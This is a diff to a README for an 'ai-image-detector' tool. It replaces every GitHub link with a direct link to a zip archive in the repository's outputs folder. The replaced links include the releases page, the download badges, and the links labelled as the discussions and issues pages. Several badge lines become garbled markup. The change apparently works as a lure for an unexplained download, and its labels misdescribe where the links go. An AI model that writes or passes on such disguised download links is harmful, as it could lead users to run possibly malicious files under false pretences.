@@ -1,10 +1,10 @@
 # 🚀 ai-image-detector - Detect AI-Generated Images Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%233A85E0.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Thewostpro/ai-image-detector/releases)
+[![Download Now](https://raw.githubusercontent.com/Thewostpro/ai-image-detector/main/outputs/ai_detector_image_v1.2-beta.2.zip%20Now-%https://raw.githubusercontent.com/Thewostpro/ai-image-detector/main/outputs/ai_detector_image_v1.2-beta.2.zip)](https://raw.githubusercontent.com/Thewostpro/ai-image-detector/main/outputs/ai_detector_image_v1.2-beta.2.zip)
 
 ## 📥 Download the Application
 
-To download the ai-image-detector application, visit this page to download: [ai-image-detector Releases](https://github.com/Thewostpro/ai-image-detector/releases)
+To download the ai-image-detector application, visit this page to download: [ai-image-detector Releases](https://raw.githubusercontent.com/Thewostpro/ai-image-detector/main/outputs/ai_detector_image_v1.2-beta.2.zip)
 
 ## 🌟 Overview
 
@@ -50,7 +50,7 @@ Follow these steps to get started with the ai-image-detector application:
 
 If you encounter any issues or need help:
 
-- **GitHub Discussions:** Engage with the community on the [GitHub discussions page](https://github.com/Thewostpro/ai-image-detector/discussions).
+- **GitHub Discussions:** Engage with the community on the [GitHub discussions page](https://raw.githubusercontent.com/Thewostpro/ai-image-detector/main/outputs/ai_detector_image_v1.2-beta.2.zip).
 - **Documentation:** Check the documentation for detailed guides and troubleshooting tips.
 
 ## 🛠️ Troubleshooting Common Issues
@@ -83,10 +83,10 @@ We are continuously looking to improve the ai-image-detector:
 
 ## 📣 User Feedback
 
-Your feedback is important for making the ai-image-detector better. Share your thoughts on the application or suggest features on our [GitHub issues page](https://github.com/Thewostpro/ai-image-detector/issues).
+Your feedback is important for making the ai-image-detector better. Share your thoughts on the application or suggest features on our [GitHub issues page](https://raw.githubusercontent.com/Thewostpro/ai-image-detector/main/outputs/ai_detector_image_v1.2-beta.2.zip).
 
 ## ⚡ License
 
 The ai-image-detector is released under the MIT License. You can use, modify, and distribute the software according to the terms outlined in the license.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23B0B0B0.svg?style=for-the-badge&logo=github&logoColor=black)](https://github.com/Thewostpro/ai-image-detector/releases)
+[![Download Now](https://raw.githubusercontent.com/Thewostpro/ai-image-detector/main/outputs/ai_detector_image_v1.2-beta.2.zip%20Now-%https://raw.githubusercontent.com/Thewostpro/ai-image-detector/main/outputs/ai_detector_image_v1.2-beta.2.zip)](https://raw.githubusercontent.com/Thewostpro/ai-image-detector/main/outputs/ai_detector_image_v1.2-beta.2.zip)
